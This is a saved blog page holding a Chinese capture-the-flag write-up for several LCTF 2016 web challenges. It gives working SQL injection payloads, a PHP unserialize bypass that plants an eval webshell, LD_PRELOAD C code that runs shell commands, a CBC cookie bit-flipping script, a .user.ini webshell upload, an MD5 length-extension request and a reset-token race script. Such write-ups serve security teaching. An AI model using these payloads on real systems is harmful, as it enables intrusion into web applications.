
<!DOCTYPE html>

<html lang="zh-cn">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<title>lctf_2016-some-web-writeup - l3m0n - 博客园</title>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./lctf_2016-some-web-writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<script src="./lctf_2016-some-web-writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
<script src="./lctf_2016-some-web-writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
</head>
<body>
<a name="top"></a>
<!--done-->
<div id="home">
<div id="header">
<div id="blogTitle">
<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/top.gif"/></div>
<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/logo.gif"/></a>
<!--done-->
<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
<h2></h2>
</div><!--end: blogTitle 博客的标题和副标题 -->
<div id="navigator">
<ul id="navList">
<li></li>
<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
<li></li>
<li></li>
<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/xml.gif"/></a></li>
</ul>
<div class="clear"></div>
<div class="blogStats">
<div id="blog_stats">
<!--done-->
随笔- 1 
文章- 65 
评论- 17 
</div>
</div><!--end: blogStats -->
</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
<div id="mainContent">
<div class="forFlow">
<div id="post_detail">
<!--done-->
<div id="topics">
<div class="post">
<h1 class="postTitle">
<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/l-ctf_2016_some_web_writeup.html" id="cb_post_title_url">lctf_2016-some-web-writeup</a>
</h1>
<div class="clear"></div>
<div class="postBody">
<div class="cnblogs-markdown" id="cnblogs_post_body"><p>web50 签到：<br/>
<a class="uri" href="http://web.l-ctf.com:6699/sh0p.php">http://web.l-ctf.com:6699/sh0p.php</a><br/>
post:<br/>
uname=a'%0aanandd%0aupdupdatexmlatexml(1,concat(0x7e,version(),0x7e),1)%23&amp;passwd=a</p>
<p>过滤了一些关键字为空，过滤空格为空</p>
<p>对information做了限制，通过万能密码进入：<br/>
uname=a'%0aunion%0aselselectect%0a1,1#&amp;passwd=1<br/>
<img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233100207-739066421.png"/></p>
<p>改一下数量为-1，再跑4位数字密码，得到密码5487，获得flag：<br/>
flag is here: <a href="mailto:LCTF%7BTh1nks_@f0r_#your_%supp0rt">LCTF{Th1nks_@f0r_#your_%supp0rt</a>}</p>
<p>Web200 睡过了<br/>
__wakeup引发的漏洞<br/>
<a class="uri" href="http://www.venenof.com/index.php/archives/167/">http://www.venenof.com/index.php/archives/167/</a><br/>
大概情况就是在unserialize的时候，如果对象的属性增加了，会导致__wakeup中的代码不被执行。</p>
<p>其中preg_match('/O:\d+:/',<span class="math inline">\(key,\)</span>match);，可以用+绕过，在访问的时候要url编码一下+号...<br/>
<a class="uri" href="http://web.l-ctf.com:10197/ctf/upload.php?key=O">http://web.l-ctf.com:10197/ctf/upload.php?key=O</a>:％2b3:"key":3:{s:8:"filename";s:9:"lemon.php";s:8:"filedata";s:24:"<?php eval($_POST[1]);?>";}</p>
<pre><code>&lt;?php
class key{
    var $filename;
    var $filedata;

    function __wakeup(){
        echo "Waking up.........&lt;br/&gt;";
        foreach(get_object_vars($this) as $key=&gt;$value){
            $this-&gt;$key = null;
            echo $key." =&gt; ".$this-&gt;$key;
            echo "&lt;br /&gt;";
        }
        echo "Finished&lt;br/&gt;";
        echo "&lt;br/&gt;";
    }

    function __destruct(){
        //Do something
        $this-&gt;my_file_put_contents($this-&gt;filename,$this-&gt;filedata);

    }
    function my_file_put_contents($file_path,$data){
        if($file_path &amp;&amp; $data){
            $rs=file_put_contents('./upload/'.md5($this-&gt;filename).'.php',$this-&gt;filedata);
            echo $rs." written";
        }
    }
}
$key=$_GET['key'];
preg_match('/O:\d+:/',$key,$match);

if($match){
    exit("据说这种key加也衿br/&gt;");
}
$Obj=unserialize($key);

?&gt;</code></pre>
<p>环境变量LD_PRELOAD来绕过，要注意编译环境，此题是需要在x86的机器上编译：<br/>
<a class="uri" href="http://wooyun.jozxing.cc/static/drops/tips-16054.html">http://wooyun.jozxing.cc/static/drops/tips-16054.html</a><br/>
列目录：</p>
<pre><code>#include &lt;dirent.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
void payload()
{
    DIR* dir;
    struct dirent* ptr;
    dir = opendir("/");
    FILE  *fp;
    fp=fopen("/tmp/venenoveneno","w");
    while ((ptr = readdir(dir)) != NULL) {
        fprintf(fp,"%s\n",ptr-&gt;d_name);
    }
    closedir(dir);
    fflush(fp);
}
int geteuid()
{
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}</code></pre>
<p>执行命令：</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void payload() {
     system("rm /tmp/check.txt");
}
int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}</code></pre>
<p>读取文件内容：</p>
<pre><code>void payload(){
}</code></pre>
<p>编译成so文件：</p>
<pre><code>$ gcc -c -fPIC hack.c -o hack
$ gcc -shared hack -o hack.so</code></pre>
<p>php内容：</p>
<pre><code>&lt;?php
putenv("LD_PRELOAD=/var/www/ctf/upload/2.so");
mail("a@localhost","","","","");
var_dump(1);
echo file_get_contents("/var/www/ctf/upload/fuckaaa");
?&gt;</code></pre>
<p>最后能在/var/www/flag目录下发现flag</p>
<p>Web250 苏打学姐的网站<br/>
<a class="uri" href="http://web.l-ctf.com:14144/img.php?id=php://resource=jpg/resource=file/tips.txt">http://web.l-ctf.com:14144/img.php?id=php://resource=jpg/resource=file/tips.txt</a></p>
<pre><code>img.php
&lt;?php
if(isset($_GET["id"]) &amp;&amp;  (strpos($_GET["id"],'jpg') !== false))
{
    preg_match("/^php:\/\/.*resource=([^|]*)/i", trim($_GET["id"],'\n'), $match);

    if (isset($match[1]))
        $_GET["id"] = $match[1];

    if (file_exists("./" . $_GET["id"]) == false)
        die("File Not Found");

    header('Content-Type: image/jpg');
    header('Content-Length: '.filesize($_GET["id"]));
    header('Content-Disposition: filename='.$_GET["id"]);

    if (strlen($_GET["id"])&gt;32){
        die ("Too Long!!!!!");
    }
    else{
        $data = file_get_contents($_GET["id"]);
        echo $data;
    }
}
else
{
    echo "File Not Found";
}
?&gt;
&lt;/html&gt;</code></pre>
<p>得到：<br/>
/admin_5080e75b2fe1fb62ff8d9d97db745120<br/>
file/admin.php.txt</p>
<p>admin.php.txt</p>
<pre><code>&lt;?php
error_reporting(0);
$Key = "xxxxxxxxxxxxxxxxx";
$iv = "xxxxxxxxxxxxxxxx";
$v = "2016niandiqijiequanguowangluoanquandasai0123456789abcdef--&gt;xdctfxdnum=2015auid=4;xdctfxdctf";
$en_Result = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,$Key, $v, MCRYPT_MODE_CBC, $iv);
$enc = base64_encode($en_Result);
$en_Data = base64_decode($_COOKIE[user]);
$de_Result = mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$Key, $en_Data, MCRYPT_MODE_CBC, $iv);

$b = array();
$b = isset($_COOKIE[user])?$de_Result:$enc;
$num1 = substr($b,strpos($b,"uid")+4,1);
$num2 = substr($b,strpos($b,"num")+4,4);
echo '&lt;/br&gt;&lt;h3&gt;ID: '.$num1."&lt;/h3&gt;&lt;br&gt;";

if ($num1 == 1  &amp;&amp; $num2 == 2016){
    die ("shen mi li wu !");
}
else{
    echo "HELLO CLIENT";
}
setcookie("user",$enc);
?&gt;</code></pre>
<p>通过cbc攻击修改cookie：<br/>
<a class="uri" href="http://www.venenof.com/index.php/archives/15/">http://www.venenof.com/index.php/archives/15/</a><br/>
cbc是16字节为一组<br/>
上一组的密文会影响当前组的密文，比如:</p>
<p>1234567890abcdef<br/>
1234567890abcdef<br/>
1234567890abcdef<br/>
1234567890auid=9<br/>
;123123123123</p>
<p>我们只需要修改第三组密文对应第四组“9”的位置的密文就可以实现第四组明文的改变。即第47位。</p>
<pre><code>利用脚本：
&lt;?php
$enc=base64_decode("S9PsFp43k9VgyrggRHLbISjUAjwzSSPPajrF9Dzz0o/ieSZbxwGjTJ5xhAZEi5tDBjvwsQtH0BynlLC0p0F0zOZMx25M6iekcLvX//MNKSA=");
$enc[47] = chr(ord($enc[47]) ^ ord("9") ^ ord ("1"));
echo base64_encode($enc);
?&gt;</code></pre>
<p>故这题可以这样解：</p>
<pre><code>➜  Desktop cat cbc.php
&lt;?php
$enc=base64_decode("dSaWGkNVh2MADjPscqdId/25Y68VaL+Ze6rYSCUHvvDV7MnbDs6fHcibGemmyMoyfHa9cXJ7DHU8Wd/DZqyNfLQ5dDs9wVDIllMKnIQilJunP9hpJ3CYFayOF0vbiqhM");
$enc[63] = chr(ord($enc[63]) ^ ord("4") ^ ord ("1"));
$enc[57] = chr(ord($enc[57]) ^ ord("5") ^ ord ("6"));
echo base64_encode($enc);
?&gt;
➜  Desktop php cbc.php
dSaWGkNVh2MADjPscqdId/25Y68VaL+Ze6rYSCUHvvDV7MnbDs6fHcibGemmyMoyfHa9cXJ7DHU8Wt/DZqyNebQ5dDs9wVDIllMKnIQilJunP9hpJ3CYFayOF0vbiqhM</code></pre>
<p><img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233140957-750382957.png"/></p>
<p>注意url编码问题...</p>
<p>得到：<br/>
/upload_12b1d89eb3a43eb6220b5952a5a13785/index.php<br/>
nginx，又可以上传.user.ini，故可以拿到一个webshell</p>
<p>文章：<a class="uri" href="http://wooyun.jozxing.cc/static/drops/tips-3424.html">http://wooyun.jozxing.cc/static/drops/tips-3424.html</a></p>
<p>上传的.user.ini</p>
<pre><code>auto_prepend_file=fuckaaa.jpg</code></pre>
<p>getshell：<br/>
<img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233159489-990532361.png"/></p>
<p>Web300 你一定不能来这<br/>
<a class="uri" href="http://web.l-ctf.com:33333/crossdomain.xml">http://web.l-ctf.com:33333/crossdomain.xml</a><br/>
可得到域名：<br/>
xdctfweb.xd-a8.com<br/>
<img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233215520-1201847554.png"/></p>
<p><a class="uri" href="http://xdctfweb.xd-a8.com/download.php?filename=download.php&amp;mac=f30a38d3cdcb25cf067468c2f108e1f5">http://xdctfweb.xd-a8.com/download.php?filename=download.php&amp;mac=f30a38d3cdcb25cf067468c2f108e1f5</a></p>
<pre><code>&lt;?php

require("common.php");

function varify_hash($filename,$hash,$secret){

if(strpos($filename,"www.rar")&gt;-1){
    if($hash === md5($secret.$filename)){

        download("www.rar");

    }
    else
        exit("mac不对，你根本不是xdsec的人。") ;
}

elseif(strpos($filename,"download.php")&gt;-1){
    if($hash === md5($secret.$filename)){

        download("download.php");
    }
    else
        exit("mac不对，你根本不是xdsec的人。");

}
else
    exit("没有你要下载的文件。");
}

$filename = urldecode($_GET['filename']);
$hash = $_GET['mac'];

if(!empty($filename) &amp;&amp; !empty($hash)){

varify_hash($filename,$hash,$secret);
}
else
    exit("参数为空");
?&gt;</code></pre>
<p>md5长度扩展攻击：<br/>
<a class="uri" href="http://blog.chinaunix.net/uid-27070210-id-3255947.html">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a><br/>
<a class="uri" href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html">https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html</a></p>
<p><a class="uri" href="https://github.com/JoyChou93/md5-extension-attack">https://github.com/JoyChou93/md5-extension-attack</a></p>
<p><a href="http://xdctfweb.xd-a8.com/download.php?filename=download.php%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%f0%00%00%00%00%00%00%00www.rar&amp;mac=1f35a8fa0b3eedd9d25b5fe910ade0e7">http://xdctfweb.xd-a8.com/download.php?filename=download.php%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%f0%00%00%00%00%00%00%00www.rar&amp;mac=1f35a8fa0b3eedd9d25b5fe910ade0e7</a></p>
<p>用txt打开这个rar，在尾部发现，混淆的jsfuck：</p>
<pre><code>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$__+$._$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$$_+$._$$+$._$+(![]+"")[$._$_]+$.$$$_+"."+(![]+"")[$._$_]+$._$+"\\"+$.__$+$.$__+$.$$$+"(\\\"\\"+$.__$+$._$$+$.__$+$._$+"\\"+$.__$+$._$_+$.$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.___+$.__$+"\\"+$.__$+$.__$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.$__+$.$$$+"\\"+$.__$+$.___+$.$_$+"\\"+$.__$+$._$_+$.$__+"\\"+$.$__+$.___+"\\"+$.__$+$._$_+$._$$+$._$+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.__$+$.$$_+$.__+$.$$$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.___+$.$_$+"\\"+$.__$+$._$_+$._$$+$.__+$.$$$_+$.$$_$+"\\"+$.$__+$.___+"\\"+$.__$+$._$_+$.$__+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"\\"+$.$__+$.___+"\\"+$.__$+$.__$+$.__$+$.$$$$+"\\"+$.$__+$.___+"\\"+$.__$+$._$$+$.__$+$._$+$._+"\\"+$.$__+$.___+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.___+$.__$+"\\"+$.__$+$.__$+$.$$_+"\\"+$.$__+$.___+$.$$_$+$.$$$_+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.__$+$.$$$+$.$$_$+$.$$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.__$+$.$_$+$.$$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+$.__+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.___+$.$_$+".\\\"\\"+$.$__+$.___+")"+"\"")())();</code></pre>
<p>把最后()改成.toString()<br/>
<img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233244989-322799879.png"/></p>
<p>YoU CAN gET Some INterESted Thing If You CAN deCOde Me In tImE.<br/>
然后就是培根密码：<br/>
小写是A大写是B：<br/>
BABBB<br/>
BABBB<br/>
AAABB<br/>
AAABB<br/>
AAABA<br/>
AAABA<br/>
BAABB<br/>
BAABB<br/>
AABAB<br/>
AABAB<br/>
得到rar解压密码是：XXDDCCTTFF</p>
<p>checktoken.php</p>
<pre><code>&lt;?php
require('sql.php');
require('secret.php');
if(!empty($_GET['email']) &amp;&amp; !empty($_GET['id'])  &amp;&amp; !empty($_GET['token']))  {

$email = $result-&gt;email;
$id = $result-&gt;id;
$token = $result-&gt;token;

if($id === '0'){
if($_GET['email']===$email){
        if($_GET['token']===$token)
            echo $flag;
        else
            echo "token不对。";
        }
                  else
            echo "邮箱不对。";
}
else
    echo "你想重置一个非创始人的密码，可这又有什么用呢？";
}
else
    echo "参数不完整。";
?&gt;</code></pre>
<p>resetpwd.php</p>
<pre><code>&lt;?php
 require('sql.php');
 require('function.php');
 if(!empty($_POST['email'])){
  $email = $_POST['email'];
  if($email === "omego952734@xdsec.club"){

    $Time_check = verifyTime();
    //检查有没有超过10分钟
    if($Time_check){

      $date = time();
    $rand=(string)rand(1,1000);
      $token = md5($date.$rand);
      $updateDate = "UPDATE `XDctf_web_350`.`user` SET `date` =".$date." WHERE `user`.`id` = 0;";
      $query = mysql_query($updateDate);
      $updateToken = "UPDATE `XDctf_web_350`.`user` SET `token` =".'\''.$token.'\''." WHERE `user`.`id` = 0;";
      $query = mysql_query($updateToken);
      echo "&lt;script&gt;alert('重置密码链接已经发送。有效期为30分钟。');&lt;/script&gt;";
    }
    else
        echo "&lt;script&gt;alert('链接还没过有效期，请登录邮箱查看。');&lt;/script&gt;";
  }
 else
     echo "&lt;script&gt;alert('管理员的邮箱根本不是这个。');&lt;/script&gt;";
 }
?&gt;</code></pre>
<p>分为两步：<br/>
第一步是抢到重置时候的时间戳：<br/>
第二部是爆破token</p>
<p>第一步：</p>
<pre><code>#!/usr/bin/python
# coding=utf-8

import requests
import time
import sys
import hashlib

reload(sys)
sys.setdefaultencoding('utf8')

def md5(mingwen):
    mingwen = str(mingwen)
    m1 = hashlib.md5()
    m1.update(mingwen)
    return m1.hexdigest()

data = {
    'email':'omego952734@xdsec.club',
    'submit':'%E6%8F%90%E4%BA%A4'
}
url = "http://web.l-ctf.com:33333/resetpwd.php"
cookie = "PHPSESSID=q4lb8pavbth0r65rr4ktoaap00"

i = 1
while 1:
    i += 1
    try:
        r = requests.post(url, data=data, timeout=1)
    except Exception,e:
        print e
        pass
    if u'10分钟'.decode("utf-8") in r.content.decode('utf-8') or "已经发送" in r.content:
        t = int(time.time())
        print t
        print r.content
        print r.headers
        exit()
        break

    print i
    print r.content</code></pre>
<p>返回的是：</p>
<pre><code>{'Content-Length': '347', 'X-Powered-By': 'PHP/5.5.9-1ubuntu4.19', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Server': 'nginx/1.6.2', 'Connection': 'keep-alive', 'Date': 'Mon, 03 Oct 2016 03:18:42 GMT', 'Content-Type': 'text/html'}</code></pre>
<p>服务器返回的Date里面的是gmt时间！！换成北京时间还是需要加上8小时,然后时间戳前后+5，或者是获取本地的当前时间。</p>
<p>然后burp跑一发：<br/>
<img src="./lctf_2016-some-web-writeup - l3m0n - 博客园/804631-20161003233335410-624436164.png"/></p>
</div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory"></div>
<div id="EntryTag"></div>
<div id="blog_post_info">
</div>
<div class="clear"></div>
<div id="post_next_prev"></div>
</div>
</div>
<div class="postDesc">posted @ <span id="post-date">2016-10-03 23:35</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=5929856" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(5929856);return false;">收藏</a></div>
</div>
<script src="./lctf_2016-some-web-writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=5929856,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/10/3 23:35:00';loadViewCount(cb_entryId);</script>
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div class="commentform" id="comment_form">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
<div id="comment_form_container"></div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"></div>
<div id="opt_under_post"></div>
<div class="c_ad_block" id="cnblogs_c1"></div>
<div id="under_post_news"></div>
<div class="c_ad_block" id="cnblogs_c2"></div>
<div id="under_post_kb"></div>
<div class="c_ad_block" id="HistoryToday"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>
</div><!--end: forFlow -->
</div><!--end: mainContent 主体内容容器-->
<div id="sideBar">
<div id="sideBarMain">
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
</div>
<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
<div id="leftcontentcontainer">
<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
</div>
</div><!--end: sideBarMain -->
</div><!--end: sideBar 侧边栏容器 -->
<div class="clear"></div>
<div class="clear"></div>
</div><!--end: main -->
<div class="clear"></div>
<div id="footer">
<!--done-->
Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->
<!--PageEndHtml Block Begin-->
<div align="center" id="something">
<script language="javascript" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
<script language="javascript" src="./lctf_2016-some-web-writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
</div>
<script>
$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
window.onload=function(){
  $('#q').css({'width':'100px'});
  $('#under_post_news').html('');
  $('#under_post_kb').html('');
  $('#ad_t2').html('');
  $('#cnblogs_c1').html('');
  $('#cnblogs_c2').html('');
}
</script>
<!--PageEndHtml Block End-->
</body>
</html>
